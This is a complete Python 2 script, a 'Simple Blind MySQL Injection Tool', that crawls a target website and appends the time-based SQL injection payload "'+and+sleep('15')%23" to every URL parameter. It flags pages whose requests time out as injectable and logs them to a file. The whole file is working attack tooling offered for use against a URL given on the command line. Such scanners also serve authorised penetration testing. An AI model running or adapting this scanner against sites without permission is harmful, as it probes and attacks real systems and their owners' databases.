# Simple Blind MySQL Injection Tool v1.0
# Author: Mert SARICA
# E-mail: mert [ . ] sarica [ @ ] gmail [ . ] com
# URL: http://www.mertsarica.com
import sys
import re
import urllib2
import urlparse
import socket
import time
import winsound
import os

proxy_info = {
'user' : '', # proxy username
'pass' : '', # proxy password
'host' : "", # proxy host (leave it empty if no proxy is in use)
'port' : 8080 # proxy port
}
        
# build a new opener that uses a proxy requiring authorization
proxy_support = urllib2.ProxyHandler({"http" : \
"http://%(user)s:%(pass)s@%(host)s:%(port)d" % proxy_info})
		
if proxy_info['host'] != "":
	opener = urllib2.build_opener(proxy_support, urllib2.HTTPCookieProcessor())
else:
	opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
	
# install it
urllib2.install_opener(opener)

if sys.platform == 'linux-i386' or sys.platform == 'linux2':
        os.system("clear")
elif sys.platform == 'win32':
        os.system("cls")
else:
        os.system("cls")


tocrawl = set([])
crawled = set([])
linkregex = re.compile('<a\s*href=[\'|"](.*?)[\'"].*?>')

socket.setdefaulttimeout(5)

def do_scan(crawling):
    while 1:
            try:
                    crawling = tocrawl.pop()
                        # print crawling
            except KeyError:
                    sys.exit(1)            
            url = urlparse.urlparse(crawling)
            try:
                    response = urllib2.urlopen(crawling)
            except urllib2.HTTPError, e:
                   continue
            except urllib2.URLError, e:
                    log_file = "sqli.txt" 
                    FILE = open(log_file, "a")
                    FILE.write(crawling)
                    FILE.close()
                    print "\n================================================================================"
                    print "\t\tBlind MySQL Injection Detected"
                    print crawling
                    print "\n===============================================================================\n"
                    winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS)
                    time.sleep(10)
                    continue
                    
            msg = response.read()
            links = linkregex.findall(msg)
            for link in (links.pop(0) for _ in xrange(len(links))):
                    if link.startswith('/'):
                            link = 'http://' + url[1] + link
                            link = link.replace("/..", "")
                    elif link.startswith('#'):
                            link = 'http://' + url[1] + url[2] + link
                            link = link.replace("/..", "")
                    elif not link.startswith('http'):
                            link = 'http://' + url[1] + '/' + link
                            link = link.replace("/../", "/")
                            link = link.replace("/./", "/")
                    rurl = "http://" + url[1]
                    if link not in crawled and link.startswith(rurl) and re.search('mailto', link) == None:
                            crawled.add(link)
                            if link.find("=") > 0 and link.find("&") > 0:
                                url = urlparse.urlparse(link)
                                params = dict([part.split('=') for part in url[4].split('&')])
                                for x in params.values():
                                    sqli = x + "'+and+sleep('15')%23"
                                    link = link.replace(x, sqli)
                                print "Crawling: ", link            
                            elif link.find("=") > 0:
                                crawled.add(link)
                                mySubString=link[link.find("=")+1:]
                                sqli = mySubString + "'+and+sleep('15')%23"
                                link = link.replace(mySubString, sqli)
                                print "Crawling: ", link
                            tocrawl.add(link)

if __name__ == '__main__': 	
	print "============================================================="
	print u"Simple Blind MySQL Injection Tool [http://www.mertsarica.com]"
	print "============================================================="
	if len(sys.argv) < 2:
		print "Usage: python sbmit.py [URL]\n"
		sys.exit(1)
		
	tocrawl = set([sys.argv[1]])
	
	try:
            do_scan(sys.argv[1])
        except KeyboardInterrupt:	
            print "[+] Bye..."  
